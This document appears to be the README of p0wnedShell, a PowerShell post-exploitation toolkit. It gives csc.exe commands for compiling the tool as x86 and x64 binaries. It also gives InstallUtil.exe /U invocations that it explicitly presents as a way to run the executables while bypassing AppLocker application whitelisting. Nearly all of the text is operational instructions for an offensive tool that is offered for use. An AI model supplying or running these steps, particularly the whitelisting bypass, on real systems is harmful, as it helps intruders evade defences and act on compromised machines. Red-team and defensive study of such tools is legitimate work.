# p0wnedShell
PowerShell Runspace Post Exploitation Toolkit 

### Author: Cn33liz

License: BSD 3-Clause

### How to Compile it:

To compile p0wnedShell you need to import this project within Microsoft Visual Studio or if you don't have access to a Visual Studio installation, you can compile it as follows:

To Compile as x86 binary:

cd \Windows\Microsoft.NET\Framework\v4.0.30319

csc.exe  /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx86.exe /platform:x86 "C:\p0wnedShell\*.cs"

To Compile as x64 binary:

cd \Windows\Microsoft.NET\Framework64\v4.0.30319

csc.exe  /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx64.exe /platform:x64 "C:\p0wnedShell\Source\*.cs"

### How to use it:

Just the run the executables or...

To run as x86 binary and bypass Applocker:

cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe

To run as x64 binary and bypass Applocker:

cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx64.exe
